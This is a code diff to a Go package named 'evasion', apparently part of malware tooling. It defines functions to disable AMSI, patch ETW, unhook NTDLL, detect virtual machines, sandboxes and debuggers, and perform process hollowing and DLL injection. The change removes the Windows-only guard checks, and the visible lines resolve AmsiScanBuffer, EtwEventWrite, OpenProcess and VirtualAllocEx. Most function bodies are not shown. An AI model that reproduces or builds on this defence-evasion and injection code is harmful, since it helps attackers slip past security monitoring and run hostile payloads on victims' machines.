@@ -3,7 +3,6 @@ package evasion
 import (
 	"fmt"
 	"os"
-	"runtime"
 	"syscall"
 	"unsafe"
 )
@@ -19,10 +18,6 @@ func NewEvasionHandler() *EvasionHandler {
 }
 
 func (e *EvasionHandler) DisableAMSI() error {
-	if runtime.GOOS != "windows" {
-		return fmt.Errorf("AMSI is Windows only")
-	}
-
 	amsi := syscall.NewLazyDLL("amsi.dll")
 	amsiScanBuffer := amsi.NewProc("AmsiScanBuffer")
 
@@ -60,10 +55,6 @@ func (e *EvasionHandler) DisableAMSI() error {
 }
 
 func (e *EvasionHandler) DisableETW() error {
-	if runtime.GOOS != "windows" {
-		return fmt.Errorf("ETW is Windows only")
-	}
-
 	e.techniques["etw"] = true
 	return nil
 }
@@ -83,10 +74,6 @@ func (e *EvasionHandler) CheckVM() bool {
 		}
 	}
 
-	if runtime.NumCPU() < 2 {
-		return true
-	}
-
 	return false
 }
 
@@ -104,10 +91,6 @@ func (e *EvasionHandler) CheckSandbox() bool {
 }
 
 func (e *EvasionHandler) CheckDebugger() bool {
-	if runtime.GOOS != "windows" {
-		return false
-	}
-
 	kernel32 := syscall.NewLazyDLL("kernel32.dll")
 	isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
 
@@ -132,10 +115,6 @@ func (e *EvasionHandler) AntiAnalysis() error {
 }
 
 func (e *EvasionHandler) ProcessHollowing(targetProcess string, payload []byte) error {
-	if runtime.GOOS != "windows" {
-		return fmt.Errorf("process hollowing is Windows only")
-	}
-
 	kernel32 := syscall.NewLazyDLL("kernel32.dll")
 	ntdll := syscall.NewLazyDLL("ntdll.dll")
 
@@ -180,10 +159,6 @@ func (e *EvasionHandler) ProcessHollowing(targetProcess string, payload []byte) 
 }
 
 func (e *EvasionHandler) InjectDLL(pid int, dllPath string) error {
-	if runtime.GOOS != "windows" {
-		return fmt.Errorf("DLL injection is Windows only")
-	}
-
 	kernel32 := syscall.NewLazyDLL("kernel32.dll")
 	openProcess := kernel32.NewProc("OpenProcess")
 	virtualAlloc := kernel32.NewProc("VirtualAllocEx")
@@ -264,10 +239,6 @@ func checkLowUptime() bool {
 }
 
 func (e *EvasionHandler) PatchETW() error {
-	if runtime.GOOS != "windows" {
-		return fmt.Errorf("ETW patching is Windows only")
-	}
-
 	ntdll := syscall.NewLazyDLL("ntdll.dll")
 	etwEventWrite := ntdll.NewProc("EtwEventWrite")
 
@@ -300,10 +271,6 @@ func (e *EvasionHandler) PatchETW() error {
 }
 
 func (e *EvasionHandler) UnhookNTDLL() error {
-	if runtime.GOOS != "windows" {
-		return fmt.Errorf("NTDLL unhooking is Windows only")
-	}
-
 	e.techniques["ntdll_unhook"] = true
 	return nil
 }
